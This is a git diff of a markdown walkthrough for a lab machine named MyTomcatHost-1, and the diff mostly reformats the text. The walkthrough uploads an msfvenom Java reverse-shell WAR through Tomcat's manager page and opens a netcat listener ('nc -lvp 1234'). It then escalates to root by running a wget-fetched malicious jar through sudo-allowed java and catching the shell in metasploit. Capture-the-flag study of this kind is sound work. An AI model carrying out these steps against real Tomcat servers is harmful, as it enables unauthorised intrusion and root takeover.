@@ -74,9 +74,13 @@ first let's create a reverse shell in java to WAR file using msfvenom and run ne
 generating payload into shell.war file.
 
 **nc -lvp 1234**
+
 **nc** - netcat, tcp and udp tool for connections and listens.
+
 **-l** - listen for connections.
+
 **-v** - verbose output.
+
 **-p** - port number.
 
 let's upload the war file into the tomcat website using the service war upload in the manager page:
@@ -87,6 +91,7 @@ if we browse to the service url: http://192.168.56.102:8080/shell/
 we got a shell!
 
 let's get a normal shell using python pty:
+
 ![foothold-shell](images/MyTomcatHost-1/reverse-shell-foothold.png)
 
 let's see our sudo allowed commands:
@@ -97,15 +102,17 @@ we can run java as root!
 lets use the same method we got the reverse shell to get a root access but this time we create a jar file.
 
 we send the jar file to the target machine using python SimpleHTTPServer and wget in tmp folder ( we got write permissions), using metasploit to connect to the reverse shell:
-*on the attacker machine:*
+
+**on the attacker machine:**
 ![reverse-shell-send](images/MyTomcatHost-1/create-shell-send.png)
-*on the target machine:*
+**on the target machine:**
 ![wget-revershell](images/MyTomcatHost-1/wget.png)
 
-*fire up metasploit and set up the exploit:*
+**fire up metasploit and set up the exploit:**
 ![msf](images/MyTomcatHost-1/msf.png)
-*run the jar file in th target machine:*
+**run the jar file in th target machine:**
 ![run-jar](images/MyTomcatHost-1/run-jar.png)
 
-and we got root access!!
+**and we got root access!!**
+
 ![root](images/MyTomcatHost-1/root.png)
